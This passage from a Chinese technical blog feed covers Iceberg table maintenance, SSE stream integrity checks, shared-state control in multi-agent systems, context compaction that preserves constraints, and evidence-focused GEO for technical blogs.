<h2 id="快照过期先保护所有有效引用"><a href="#快照过期先保护所有有效引用" class="headerlink" title="快照过期先保护所有有效引用"></a>快照过期先保护所有有效引用</h2><p>Expire snapshots 前要识别 branches、tags、审计&#x2F;回滚窗口和仍在运行的 reader。按时间删除但保留最近 N 个，避免低频表一次清空可用历史。表级删除操作也应经过审批和 dry-run 统计。</p>
<p>数据文件只有在不再被任何有效 snapshot 引用后才可删除。分支或 tag 长期固定在旧 snapshot，会让文件无法回收；这不是清理器失效，而是保留策略的真实成本。平台应把持有者和预计空间显示出来。</p>
<p>流式高频提交会产生大量 metadata JSON。自动删除旧 metadata 前确认实现只删除 metadata log 中安全可回收的版本，并保留故障恢复需要的窗口。不要把对象存储 lifecycle 直接套在 metadata 目录上，它看不懂表引用。</p>
<p>维护操作本身生成的 snapshot 也要计入节奏。频繁小 compaction 可能比原始小文件问题制造更多元数据，调度阈值必须用运行结果校准。</p>
<h2 id="Orphan-清理是最危险的一步"><a href="#Orphan-清理是最危险的一步" class="headerlink" title="Orphan 清理是最危险的一步"></a>Orphan 清理是最危险的一步</h2><p>Orphan 的定义是存储里存在、但当前可达 metadata 中没有引用的文件。正在运行但尚未提交的 writer 也符合这个表面特征。因此最小文件年龄必须长于最长合法写入、重试、审批和提交恢复窗口，并留足时钟&#x2F;队列余量。</p>
<p>路径字符串必须规范一致。Catalog metadata 记录 <code>s3://bucket/path</code>，文件系统列表返回另一 authority 或编码形式，差异可能把所有有效文件判成 orphan。正式删除前先输出候选清单，抽样与引用集合对照。</p>
<p>我会采用 mark-and-sweep：第一轮只标 candidate 与发现时间，第二轮在保留期后重新计算引用，仍未引用且没有 active writer lease 才批量删除。每批记录 manifest、大小、结果和失败项，支持停止，但不假装对象存储删除可轻松回滚。</p>
<p>跨表共享目录原则上禁止。若历史架构无法避免，orphan 扫描必须覆盖所有引用方，否则按单表视角会误删别人的文件。</p>
<h2 id="每次维护都要验证收益和副作用"><a href="#每次维护都要验证收益和副作用" class="headerlink" title="每次维护都要验证收益和副作用"></a>每次维护都要验证收益和副作用</h2><p>任务成功后重新读取表当前 snapshot，确认提交存在、源文件不再由新状态使用、输出文件可读、行数&#x2F;关键聚合与预期一致。Compaction 不应改变业务数据，delete file 重写还要验证删除语义。</p>
<p>记录 before&#x2F;after：文件数与大小分布、manifest、规划延迟、扫描成本、存储回收、运行资源和提交冲突。没有收益的维护减少频率，收益稳定再推广，不按“任务成功数”考核平台。</p>
<p>当查询 SLA 恢复而维护积压仍高，要看阈值是否过严；当维护指标漂亮但用户查询没改善，瓶颈可能在分区、排序或引擎。表维护是性能治理的一环，不是万能药。</p>
<p>我更愿意把表维护看作湖仓的垃圾回收与索引整理：正常运行必须有，时机和安全边界却不能粗暴。进入 SLA 之后，团队才能在性能、存储、回滚能力和业务写入之间做稳定取舍，而不是等表变慢再救火。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://iceberg.apache.org/docs/latest/maintenance/">Apache Iceberg Maintenance</a></li>
<li><a href="https://iceberg.apache.org/docs/latest/flink-maintenance/">Apache Iceberg Flink TableMaintenance</a></li>
<li><a href="https://iceberg.apache.org/spec/">Apache Iceberg Spec：Snapshots 与 Metadata</a></li>
<li><a href="https://sre.google/workbook/implementing-slos/">Google SRE Workbook：Implementing SLOs</a></li>
</ul>
]]></content>
      <categories>
        <category>湖仓架构</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>SLA</tag>
        <tag>表维护</tag>
      </tags>
  </entry>
  <entry>
    <title>SSE 完整性为什么要用事件不变量验证：HTTP 200 只能证明连接建立过</title>
    <url>//2026/06/25/sse-event-invariants/</url>
    <content><![CDATA[<p>模型接口返回 HTTP 200，页面也开始逐字输出，很多监控就把请求记为成功。用户最后却只得到半句话，或工具参数少了一个括号。对流式链路来说，200 证明的只是响应头成功返回，不证明业务事件完整，更不证明最终结果已经保存。</p>
<p>我更倾向用事件不变量验收 SSE：对任意一次 Run，无论供应商协议、网关转换、代理缓冲和客户端重连怎样变化，都有一组顺序、唯一性、组装与终态条件必须成立。违反条件就明确标失败或未知，不能靠 EOF 猜成功。</p>
<p class="article-diagram-scroll"><img src="/images/articles/sse-event-invariants.svg" class="lazyload" data-srcset="/images/articles/sse-event-invariants.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="SSE 事件不变量检查链"></p>
<span id="more"></span>

<h2 id="先分清传输帧和业务事件"><a href="#先分清传输帧和业务事件" class="headerlink" title="先分清传输帧和业务事件"></a>先分清传输帧和业务事件</h2><p>SSE wire format 用 <code>event/data/id/retry</code> 字段与空行分隔事件，注释行可作 heartbeat。一条业务事件可能被 TCP、HTTP&#x2F;2 或代理拆成任意字节块，客户端必须按 SSE 语法解析，不能假设一次 <code>read()</code> 就是一条完整 JSON。</p>
<p>反过来，一个模型内容块也可能跨多条 SSE event 增量传输。网关先解析传输帧，再根据 provider 语义组成规范事件，例如 response.started、content.delta、tool.arguments.delta、tool.completed、response.completed&#x2F;failed。</p>
<p>我会保留三层计数：raw bytes&#x2F;chunks、SSE events、normalized domain events。三者数量不同很正常，但每层有自己的 parser errors、last sequence 和 close reason。把所有东西都叫 chunk，出了问题无法定位是哪层切坏了。</p>
<p>代理缓冲会把多个 event 延迟送达，压缩和换行处理可能改变边界。上线前要真实经过 CDN、Ingress、服务网格和浏览器测试，而不是只用服务端单元测试证明 parser 正确。</p>
<h2 id="顺序和唯一性必须可计算"><a href="#顺序和唯一性必须可计算" class="headerlink" title="顺序和唯一性必须可计算"></a>顺序和唯一性必须可计算</h2><p>每条规范事件带 run&#x2F;response id 与单调 sequence，内容块再带 output&#x2F;item&#x2F;content indices。接收端检查 sequence 不回退、不无故跳号；允许重连重放时，同一 sequence 的 payload hash 必须一致，并按 event ID 去重。</p>
<p>并行工具调用会交错增量，不能仅按到达顺序拼一个全局字符串。arguments delta 按 tool call&#x2F;item id 分桶，各自维护 JSON buffer；completed 前必须能解析且满足 schema。一个工具完成不能隐式关闭另一个工具。</p>
<p>文本、reasoning、citation、audio 与 tool call 都有独立生命周期。adapter 不认识的新 event type，应记录并按兼容策略处理，不能静默塞进文本。协议版本固定在 Run Bundle，避免升级后同一 raw stream 得到不同解释。</p>
<p>事件时间只用于观测，不用于排序。跨服务时钟会漂移，真正的顺序来自上游 sequence 与本地 append offset；没有上游序号，就由入口 adapter 在单连接内分配，并明确它不能代表 provider 内部顺序。</p>
<h2 id="终态不变量决定成功还是未知"><a href="#终态不变量决定成功还是未知" class="headerlink" title="终态不变量决定成功还是未知"></a>终态不变量决定成功还是未知</h2><p>一次 Attempt 恰好有一个规范终态：completed、failed 或 cancelled；连接 EOF、socket reset、客户端 close 都不是业务终态。如果底层断开而未收到终态，Attempt 是 <code>closed_without_terminal</code>，Run 决定恢复、查询或失败。</p>
<p>completed 要满足所有已开始 content&#x2F;tool blocks 已结束，所有必需工具结果已关联，usage&#x2F;finish 可缺省但缺失有标记，最终可见输出与持久化产物 hash 一致。终态之后收到新的 delta 是协议错误，不继续拼接。</p>
<p>failed 保存 provider error、adapter error 或下游 error 的原始分类；cancelled 区分用户取消、deadline、budget 与上游取消。前端都显示“已停止”可以，诊断数据不能混成一个状态。</p>
<p>有些 provider 先结束模型响应，Agent 随后执行工具并发起下一次模型调用。这里 response terminal 不等于 Run terminal。层级状态机明确 Attempt、Step 和 Run 的终态，避免模型调用 completed 就提前把整个任务写成功。</p>
<h2 id="重连要靠游标，不靠重复整次请求"><a href="#重连要靠游标，不靠重复整次请求" class="headerlink" title="重连要靠游标，不靠重复整次请求"></a>重连要靠游标，不靠重复整次请求</h2><p>SSE 的 <code>id</code>&#x2F;Last-Event-ID 提供重连基础，但业务系统仍需持久 event log 与保留窗口。客户端确认最后应用的序号，重连后服务端从下一条投递；重复事件按 id 去重，断档则返回明确的 <code>cursor_expired</code>，再走结果快照恢复。</p>
<p>如果后端没有持久事件，自动重新调用模型不是“重连”，而是新 Attempt。它可能产生另一份回答和重复工具副作用。界面要显示重新生成，并使用新的 attempt&#x2F;operation ids。</p>
<p>慢客户端会造成背压。服务端限制每连接 buffer，超过阈值可以断开让客户端按游标恢复；不能无限堆内存，也不能丢掉中间 tool delta 后继续发 terminal。heartbeat 只判断通道活性，不推进业务 cursor。</p>
<p>客户端刷新页面后先取 durable snapshot，再订阅 snapshot version 之后的事件，可以避免“查询结果和订阅之间”丢消息。这个模式和数据同步里的 snapshot + change log 很像，边界要由版本号衔接。</p>
<h2 id="测试要故意在每个边界断开"><a href="#测试要故意在每个边界断开" class="headerlink" title="测试要故意在每个边界断开"></a>测试要故意在每个边界断开</h2><p>我会构造字符级随机切片，确保中文多字节、<code> \n</code>、多行 data 和 JSON 字符串跨 chunk 仍可解析；再生成事件重复、乱序、缺号、未知类型、终态缺失和终态后增量，验证 checker 能拒绝。</p>
<p>链路故障测试在 provider-&gt;gateway、gateway-&gt;Ingress、Ingress-&gt;browser 各自断开；终态落库前后杀进程；让客户端带旧 cursor 重连；制造慢消费者。每种情况下都核对 Run 状态、事件历史、页面内容和是否重复调用工具。</p>
<p>线上指标至少有 closed_without_terminal、sequence_gap、duplicate_mismatch、invalid_tool_json、terminal_after_terminal、snapshot_hash_mismatch、reconnect_replay_count。总请求成功率会把这些关键问题平均掉。</p>
<p>排查时保留原始字节&#x2F;事件的受控采样与 adapter version。只保存最终拼好的文本，会失去证明“上游完整、转换丢失”或“上游本来就断了”的证据。</p>
<p>流式体验给用户的是逐步反馈，工程上承担的却是一条分布式事件协议。只有把不变量写进解析器、存储和监控，系统才知道一段回答是真的完成，还是仅仅在 HTTP 200 之后停止了。出现断链后如何逐层找证据，见 <a href="/2026/03/25/agent-diagnostic-evidence-chain/">Agent 诊断证据链</a>；协议修复后的验证方法见 <a href="/2025/08/04/agent-regression-fixed-environment/">Agent 回归验证</a>。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://html.spec.whatwg.org/multipage/server-sent-events.html">WHATWG HTML：Server-sent events</a></li>
<li><a href="https://www.w3.org/TR/eventsource/">W3C EventSource：Last-Event-ID 与重连模型</a></li>
<li><a href="https://platform.openai.com/docs/guides/streaming-responses">OpenAI API：Streaming Responses</a></li>
<li><a href="https://docs.anthropic.com/en/api/messages-streaming">Anthropic API：Streaming Messages</a></li>
</ul>
]]></content>
      <categories>
        <category>模型工程</category>
      </categories>
      <tags>
        <tag>流式协议</tag>
        <tag>SSE</tag>
        <tag>事件不变量</tag>
      </tags>
  </entry>
  <entry>
    <title>多 Agent 并发为什么要控制共享状态：分工不等于可以同时乱写</title>
    <url>//2026/06/26/multi-agent-shared-state/</url>
    <content><![CDATA[<p>把一个任务拆给多个 Agent，吞吐量看起来会立刻提升。真正跑到共享仓库、文档或业务系统时，问题也随之出现：两个 Agent 同时改同一文件，研究 Agent 更新了结论，写作 Agent 还在引用旧证据，两个执行 Agent 重复提交同一工单。</p>
<p>多 Agent 首先是并发系统，其次才是角色设计。分工名称并不会自动提供隔离、一致性和幂等。共享状态必须有 owner、版本和合并语义，外部副作用必须回到单一的授权与提交边界。</p>
<p class="article-diagram-scroll"><img src="/images/articles/multi-agent-shared-state.svg" class="lazyload" data-srcset="/images/articles/multi-agent-shared-state.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="多 Agent 共享状态控制"></p>
<span id="more"></span>

<h2 id="先画出哪些状态真的共享"><a href="#先画出哪些状态真的共享" class="headerlink" title="先画出哪些状态真的共享"></a>先画出哪些状态真的共享</h2><p>我会把协作状态分成四类：任务图与分配、证据和中间 artifact、共享工作区文件、外部系统副作用。它们的并发策略不同，不能统一塞进一段 group chat。</p>
<p>任务图由协调器维护，worker 领取带 lease 的 task node；证据 artifact 采用不可变版本，消费者引用具体 version；代码文件可用分支&#x2F;patch 隔离再合并；外部副作用通过 operation registry 去重并串行审批。</p>
<p>消息只是通知，不是权威状态。Agent 说“我完成了”不代表 artifact 已提交，协调器要看到 task transition 的 compare-and-set 与验收结果。Agent 消息丢失或重复，不应改变最终任务状态。</p>
<p>每个共享对象定义 source of truth、写入者、读一致性、版本字段、冲突处理和保留期。没有这张表，团队往往一边把数据库当事实，一边又让最新聊天消息覆盖它。</p>
<h2 id="Task-Ownership-用-Lease-而不是口头认领"><a href="#Task-Ownership-用-Lease-而不是口头认领" class="headerlink" title="Task Ownership 用 Lease 而不是口头认领"></a>Task Ownership 用 Lease 而不是口头认领</h2><p>节点从 ready 进入 leased&#x2F;running，带 worker、lease version 与 expiry。Worker 定期续租；超时后协调器可以重新分配，但旧 worker 的迟到结果不能直接提交，必须携带仍有效的 lease token 做条件写。</p>
<p>Exactly-once worker 执行很难保证，平台按 at-least-once 设计。任务逻辑需要幂等，或把结果写成新 artifact 再由协调器选择。两个 worker 因网络分区都执行完，最终只接受符合当前 lease&#x2F;version 的提交，另一个标 superseded。</p>
<p>依赖节点引用上游 artifact version，而不是“任务 A 的最新结果”。上游修订后，协调器决定使哪些下游 stale、重跑或继续。让下游自动读取 latest，会在一次运行中混入不同版本的世界。</p>
<p>取消也通过状态机传播。父任务取消后，停止派发，撤销 leases；已发生的 Operation 单独跟踪。不能因为聊天里发了一句 stop，就假设所有 worker 和远程工具已停止。</p>
<h2 id="Artifact-尽量不可变，修改用新版本"><a href="#Artifact-尽量不可变，修改用新版本" class="headerlink" title="Artifact 尽量不可变，修改用新版本"></a>Artifact 尽量不可变，修改用新版本</h2><p>研究资料、计划、代码 patch、评审意见和测试报告都写成 artifact，包含 producer、input versions、schema、content hash 与 created time。修改创建新 version，并用 supersedes&#x2F;derived-from 表达关系。</p>
<p>多个 Agent 对同一事实给出不同结论时，不让最后写入者覆盖。保留两份 evidence 与 claim，由聚合者比较来源和适用范围，产生 accepted&#x2F;rejected&#x2F;unresolved decision。未决冲突不能在最终报告里悄悄选一边。</p>
<p>大型文档可按 section ownership 分区，但标题、术语表、结论摘要仍是共享热点。分配单写 owner，其他 Agent 提 patch&#x2F;comment；合并时验证 base version。简单的 markdown 文本也需要乐观锁，否则评审意见可能打在已经消失的段落上。</p>
<p>结构化数据优先用领域级合并，不用文本三方合并猜语义。比如 sources 按 canonical URL 去重，事实按 claim ID 合并，测试结果按 case&#x2F;version 追加。CRDT 适合部分协作字段，却不能自动解决“两个结论哪个正确”。</p>
<h2 id="工作区写入需要隔离和合并门"><a href="#工作区写入需要隔离和合并门" class="headerlink" title="工作区写入需要隔离和合并门"></a>工作区写入需要隔离和合并门</h2><p>代码任务让每个 Agent 使用独立 worktree&#x2F;branch 或 copy-on-write workspace。它们可以同时读相同基线，写自己的 patch；合并由明确 owner 串行执行，检查用户原有改动、冲突、测试和安全扫描。</p>
<p>共享同一目录时至少使用文件范围锁和 base hash。Agent 写前声明 write set，提交时 compare；发现文件已变就重新读取并重做 patch。不要用 <code>git reset</code>、强制覆盖或“以我版本为准”解决并发。</p>
<p>构建产物、依赖缓存与临时文件按 worker 隔离。两个 Agent 同时覆盖 <code>dist/</code>、锁文件或测试数据库，可能让验证结果互相污染。缓存可共享只读内容寻址对象，可写状态按 Run 分区。</p>
<p>合并成功不等于任务成功。集成基线再跑整体构建、接口测试与语义验收；并行分支各自通过，只说明局部世界成立。</p>
<h2 id="外部副作用要经过统一-Operation-Registry"><a href="#外部副作用要经过统一-Operation-Registry" class="headerlink" title="外部副作用要经过统一 Operation Registry"></a>外部副作用要经过统一 Operation Registry</h2><p>发消息、创建 MR、提交任务、改 DNS 或写数据库，不能由多个 worker 看到相同意图就各自执行。协调器为逻辑操作生成 operation key，记录规范化对象、参数、权限与状态；工具网关只接受当前 owner 的提交。</p>
<p>Agent 可以并行准备方案和验证证据，高风险 commit 串行化。审批绑定 operation version；参数改变后重新审批。重复请求返回原结果，状态未知先向外部系统核对，不创建第二个操作。</p>
<p>不同副作用若相互独立可并行，但要显式声明 conflict key，例如 tenant+resource、repository+branch、table+partition。调度器对相同 key 排序，比让语言模型猜“应该不会冲突”可靠。</p>
<p>人工也是共享状态参与者。人在页面改了文件或关闭工单，Agent 下一次提交必须看到 version change；不能把人的动作当异常覆盖掉。</p>
<h2 id="并行收益要扣掉协调成本"><a href="#并行收益要扣掉协调成本" class="headerlink" title="并行收益要扣掉协调成本"></a>并行收益要扣掉协调成本</h2><p>指标不能只看 worker 数和总耗时。还要看 stale work ratio、lease reassignment、merge conflict、duplicate operation、artifact invalidation、协调 token 与人工解决冲突时间。任务拆得越碎，交接和上下文复制越贵。</p>
<p>只有能独立产出且合并规则清楚的子任务适合并行：不同资料源研究、互不相交模块检查、独立测试。单一文件连续改写、强顺序诊断和同一生产对象操作，串行往往更快。</p>
<p>测试要注入 worker 超时后复活、重复消息、artifact 迟到、合并时用户改动、两个 Operation 同时提交。验收最终 source of truth，而不是协调器日志看起来有序。</p>
<p>多 Agent 的可靠性来自受控共享，而不是更多角色标签。把任务所有权、artifact 版本、工作区隔离和副作用提交分别管住，才有资格享受并行带来的速度；否则只是让竞态也具备了自然语言能力。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://dataintensive.net/">Martin Kleppmann：Designing Data-Intensive Applications 相关资料</a></li>
<li><a href="https://git-scm.com/docs/gitworkflows">Git Documentation：gitworkflows</a></li>
<li><a href="https://docs.temporal.io/workflow-execution">Temporal：Workflow Execution</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace API：Links 与并发工作关联</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Multi-Agent</tag>
        <tag>并发控制</tag>
        <tag>共享状态</tag>
      </tags>
  </entry>
  <entry>
    <title>上下文压缩为什么不能丢掉未决约束：摘要不是聊天记录的缩写</title>
    <url>//2026/07/10/context-compaction-constraints/</url>
    <content><![CDATA[<p>长任务超过上下文窗口后，把前半段对话总结成几段文字再继续，是最直接的压缩方法。它也最容易丢掉关键东西：用户说“不要提交”，摘要只保留了“修改配置”；工具状态仍未知，却被写成“部署失败”；一个尚未回答的问题从列表中消失。</p>
<p>上下文压缩不是文学摘要。它要把后续执行所需的约束和状态，从大量过程文本迁移到更小、可验证的运行表示。哪些可以概括，哪些必须原样保留，应该由信息职责决定，而不是按 token 比例截取。</p>
<p class="article-diagram-scroll"><img src="/images/articles/context-compaction-constraints.svg" class="lazyload" data-srcset="/images/articles/context-compaction-constraints.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="上下文压缩的约束保全模型"></p>
<span id="more"></span>

<h2 id="先把上下文拆成不同职责"><a href="#先把上下文拆成不同职责" class="headerlink" title="先把上下文拆成不同职责"></a>先把上下文拆成不同职责</h2><p>我会把长任务信息分为：用户目标与范围、硬约束和禁止项、已确认事实、技术决定及理由、未决问题、任务进度、外部操作状态、证据&#x2F;产物引用、交流偏好。它们的压缩方式完全不同。</p>
<p>原始日志可以用定位摘要替代，保留查询窗口和 artifact link；已经验证的事实可规范成 claim；用户明确禁止的动作必须逐条保留；外部操作若状态未知，绝不能为了让摘要顺畅而改写成失败或成功。</p>
<p>模型生成的推断与工具直接返回的事实分开。摘要器常把“可能由配置导致”压成“配置导致”，一次压缩就把概率变成结论。每条 claim 带 evidence level 和来源引用，后续模型才能知道是否还需验证。</p>
<p>用户后来的更正覆盖早期信息，但历史理由仍可引用。比如发布日期已从一个日期改为另一个日期，active constraint 只保留新值，同时记录 supersedes；把两句原话都塞进去，会让执行模型再次犹豫。</p>
<h2 id="未决约束要用台账，不靠自然语言记忆"><a href="#未决约束要用台账，不靠自然语言记忆" class="headerlink" title="未决约束要用台账，不靠自然语言记忆"></a>未决约束要用台账，不靠自然语言记忆</h2><p>为每个约束分配稳定 ID，记录内容、scope、source、created_at、status 和 supersedes。<code>MUST_NOT_DEPLOY_BEFORE_QA</code>、<code>DO_NOT_PRINT_CREDENTIAL</code> 这类边界进入 active constraint set，每次压缩做集合校验。</p>
<p>未决事项也有状态机：open、in_progress、waiting_external、resolved、dropped_with_reason。摘要器不能因为它在最近几轮没出现就删除；只有明确解决或用户取消，才离开 active set。</p>
<p>任务计划与证据绑定。一个 step 标 completed，必须有 artifact&#x2F;test&#x2F;operation outcome；“已经开始写”不等于完成。压缩时从任务源状态生成进度，不让模型根据聊天口吻自行判断。</p>
<p>审批和权限具有作用域与时效。保留批准的具体对象、参数 hash、版本和过期时间，而不是一句“用户同意部署”。后续计划变化时，系统能判断旧批准不可复用。</p>
<h2 id="大内容留引用，关键原文留摘录"><a href="#大内容留引用，关键原文留摘录" class="headerlink" title="大内容留引用，关键原文留摘录"></a>大内容留引用，关键原文留摘录</h2><p>源码、日志、网页和报告放 artifact store，以 content hash、版本、权限和可定位范围引用。压缩结果写“在 A 的 120–160 行观察到 X”，而不是复制一万行，也不能只写“看过日志”。</p>
<p>关键原文包括用户硬约束、外部 API 的错误码与终态、精确命令参数、schema 和协议字段。它们对一个字符都敏感，适合原样片段；其他解释性内容可结构化归纳。</p>
<p>引用必须可再取。如果临时文件会消失，就在压缩前持久化到 Run artifact；网页可能变化，保存访问时间、URL 与快照 hash。指向当前 latest 的链接不能支撑历史判断。</p>
<p>敏感内容不因“必须原样”就进入摘要。凭证保存 secret reference 与用途，值留在凭证系统；PII 和业务数据按最小必要字段脱敏。压缩副本越多，泄漏面越大。</p>
<h2 id="Compaction-本身需要输入输出契约"><a href="#Compaction-本身需要输入输出契约" class="headerlink" title="Compaction 本身需要输入输出契约"></a>Compaction 本身需要输入输出契约</h2><p>触发压缩时固定 cutoff event、输入 Bundle 和 compactor version。输出不仅有自然语言 summary，还包含 active constraints、claims、open items、artifact refs、operation states 和 discarded categories。新事件从 cutoff 之后追加，避免压缩期间到达的消息丢失。</p>
<p>压缩前后跑不变量：所有 active hard constraints 仍存在；所有 waiting&#x2F;unknown Operation 仍可定位；未完成 plan nodes 数量一致；引用可读取且 hash 匹配；权限 scope 不扩大；事实没有从 inferred 升级为 verified。</p>
<p>若检查失败，拒绝切换到新 context snapshot，继续用旧版本或减少压缩范围。不能让一个看似流畅的摘要成为唯一历史后再发现约束消失。</p>
<p>多级压缩要防错误累积。第二次不要只总结第一次摘要，关键状态从结构化 source of truth 重新生成，长期事实回看原证据。自然语言摘要可以递归压缩，约束和操作状态不能靠传话。</p>
<h2 id="评测重点是后续行为有没有漂移"><a href="#评测重点是后续行为有没有漂移" class="headerlink" title="评测重点是后续行为有没有漂移"></a>评测重点是后续行为有没有漂移</h2><p>摘要相似度不是核心指标。我要比较压缩前后 Agent 在同一 continuation 上是否做出一致的安全决定、引用相同事实、保留相同未决项，并在证据不足处同样停止。</p>
<p>测试集专门包含否定条件、后续更正、同名对象、半完成工具、未知副作用、过期审批和多个并行子任务。普通问答摘要很容易通过，这些边界才会暴露 compaction 的危险遗漏。</p>
<p>线上观察 compaction 后 constraint violation、用户重复纠正、旧对象复活、重复 Operation、无法解释的 plan completed 和 artifact missing。发现漂移可回滚到上一 context snapshot 重放，而不是从残缺摘要继续修补。</p>
<p>压缩比也不是越高越好。代码重构任务需要保留变更和测试状态，研究任务需要证据与反例，生产操作需要对象、权限和结果。按任务风险分配 token，宁可早归档大量寒暄，也不能压掉一条“不要执行”。</p>
<p>Context Engineering 最终是在有限窗口里管理工作状态。摘要只是其中一个视图。把未决约束、事实等级、操作状态和证据引用独立出来，Agent 才能在压缩之后继续同一个任务，而不是带着一份看起来像历史的新故事重新开始。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://cookbook.openai.com/examples/agents_sdk/session_memory">OpenAI Cookbook：Context Engineering</a></li>
<li><a href="https://www.anthropic.com/research/building-effective-agents">Anthropic：Building effective agents</a></li>
<li><a href="https://www.w3.org/TR/prov-overview/">W3C PROV：实体、活动与来源关系</a></li>
<li><a href="https://docs.temporal.io/workflow-execution/event">Temporal：Event History 与 Workflow Replay</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>上下文工程</tag>
        <tag>Context Compaction</tag>
        <tag>约束管理</tag>
      </tags>
  </entry>
  <entry>
    <title>技术博客做 GEO 为什么要先把事实写清楚：可抽取不等于堆关键词</title>
    <url>//2026/08/04/technical-blog-geo-evidence/</url>
    <content><![CDATA[<p>技术博客做 GEO，最容易走偏的动作是批量加“最佳实践、权威专家、深度解析”这类词。页面看起来更像宣传稿，真正可被验证的事实反而变少。搜索引擎或生成式答案可以抽取句子，却无法判断作者到底解决过什么问题。</p>
<p>我理解的 GEO 不是一套独立于 SEO 的魔法标签，而是让机器和读者都能准确回答三件事：这篇文章解决什么问题，依据是什么，作者为什么有资格提出这个判断。先把事实和证据写清，再谈抓取与结构化表达。</p>
<p class="article-diagram-scroll"><img src="/images/articles/technical-blog-geo-evidence.svg" class="lazyload" data-srcset="/images/articles/technical-blog-geo-evidence.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="技术博客 GEO 的事实与发现链"></p>
<span id="more"></span>

<h2 id="作者实体要稳定，但不能包装成虚构履历"><a href="#作者实体要稳定，但不能包装成虚构履历" class="headerlink" title="作者实体要稳定，但不能包装成虚构履历"></a>作者实体要稳定，但不能包装成虚构履历</h2><p>站点需要一页明确的个人介绍：姓名、常用署名、当前公开身份、所在城市、长期研究方向和可验证的公开链接。文章 byline 指向这个稳定 URL，Person&#x2F;ProfilePage 数据也使用同一个 <code>@id</code>，避免每篇生成一份略有差异的“作者”。</p>
<p>专业定位要有边界。“数据中台与 AI Agent 工程化”比“全栈 AI 专家”更可验证，下一层再列数据集成、任务调度、元数据、模型网关、MCP、评测和可观测性。主题越聚焦，文章之间越能形成真实的知识关系。</p>
<p>公司品牌和任职主体可能有工商名、对外名与产品名，介绍里写清对应关系，不制造多个经历。公开工作内容以能说明的职责为限，客户、项目数据和未公开成果不能为了增强可信度而虚构。</p>
<p><code>sameAs</code> 只链接确实属于作者的 GitHub、公开主页或社区账号。没有权威外链就留空，比链接一个同名账户安全。结构化数据能表达事实，不能创造事实。</p>
<h2 id="标题围绕工程问题，正文给出可核验答案"><a href="#标题围绕工程问题，正文给出可核验答案" class="headerlink" title="标题围绕工程问题，正文给出可核验答案"></a>标题围绕工程问题，正文给出可核验答案</h2><p>用户搜索的往往是“DataX 为什么速度上不去”“SSE 200 但没有完整结果”“Iceberg 提交冲突怎么判断能否重试”。标题直接写对象、症状和判断，比“关于数据平台的一些思考”更容易理解，也更符合真实问题。</p>
<p>开头两段给出适用场景和核心结论，随后解释证据、机制、边界与验证。生成式系统容易抽取明确句子，但句子必须在上下文中成立。为了被引用而写绝对化金句，遇到版本和条件变化会迅速失真。</p>
<p>我会区分观察、推断和建议。例如“trace 中缺少 terminal event”是观察，“adapter 丢事件”需要上下游对照才是结论，“增加重连”是方案且有前提。把三者混在一起，读者和模型都容易把猜测当事实。</p>
<p>每篇保留一段实际判断路径：查了哪些日志&#x2F;源码&#x2F;配置，用什么 A&#x2F;B 排除，最终如何验证。没有真实生产数据时，可用最小可复现实验或明确的假设案例，但要说清边界，不能冒充事故实录。</p>
<h2 id="引用要能支撑具体命题"><a href="#引用要能支撑具体命题" class="headerlink" title="引用要能支撑具体命题"></a>引用要能支撑具体命题</h2><p>技术文章优先引用官方规范、源码、发布说明和论文，并尽量链接到具体版本。正文说“某版本引入了某能力”，引用 current 首页不够；需要对应 release&#x2F;spec。历史文章不能引用后来才出现的能力来证明当时判断。</p>
<p>引用不是篇尾堆四个链接。关键事实附近说明来源，文章末尾再放对照资料。自己的分析要明显区别于资料原意，避免把文档改写成另一份文档。</p>
<p>图也应是证据结构。架构图标出状态、边界、数据流和失败分支，配套 PlantUML 源码可追踪；装饰性的机器人、发光大脑并不能说明系统怎样工作。图片有描述性 alt、稳定 URL 和合理尺寸，既方便读者，也方便索引理解。</p>
<p>日期必须反映真实发布与实质修改。修正错别字不必把旧文伪装成今天的新文章；架构和结论发生变化时更新 <code>dateModified</code>，并在必要时写变更说明。可验证性比营造“长期活跃”更重要。</p>
<h2 id="站点结构让实体和主题互相连接"><a href="#站点结构让实体和主题互相连接" class="headerlink" title="站点结构让实体和主题互相连接"></a>站点结构让实体和主题互相连接</h2><p>文章使用稳定 permalink、唯一 canonical、准确 title&#x2F;description、一个清晰 H1 与有层级的 H2。分类按长期问题域组织，标签用于技术对象和机制，不为每个关键词新建一个空标签页。</p>
<p>个人页链接代表性文章，文章 byline 回到个人页；专题页串起从基础机制、故障诊断到生产治理的内容。内部链接使用说明性文字，比如“DataX 吞吐预算模型”，不要全写“点击这里”。</p>
<p>BlogPosting&#x2F;Article JSON-LD 包含 headline、description、image、datePublished、dateModified、author Person URL、publisher 与 mainEntityOfPage。个人页用 ProfilePage + mainEntity Person。页面可见内容与 JSON-LD 必须一致，不在结构化数据里塞页面没有的头衔或评价。</p>
<p>Sitemap 只包含 canonical 可索引页面，robots.txt 允许目标 crawler 访问文章与资源。404 真正返回 404，旧 URL 有明确对应才做 301；把所有失效链接重定向首页会破坏语义。</p>
